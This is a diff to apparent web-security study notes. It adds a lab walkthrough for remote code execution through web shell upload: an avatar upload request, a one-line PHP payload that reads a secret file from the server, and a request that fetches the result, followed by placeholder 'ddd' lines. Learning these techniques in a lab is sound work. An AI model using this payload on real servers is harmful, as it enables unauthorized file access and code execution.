@@ -920,6 +920,19 @@
 - use an established framework for preprocessing file uploads      
 
 ### File Upload Lab
+- Remote code execution via **web shell upload**
+  - upload image
+    POST /my-account/avatar
+    **Content-Disposition: form-data; name="avatar"; filename="profile.png"**
+    **Content-Type: image/png **  
+    Content-Disposition: form-data; name="user"
+    Content-Disposition: form-data; name="csrf"
+  - Upload **exploit.php**
+    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+  - GET /files/avatars/exploit.php   > secret code
+- ddd
+- ddd
+- ddd
 
 ## Race Condition
 Content for Race Condition...
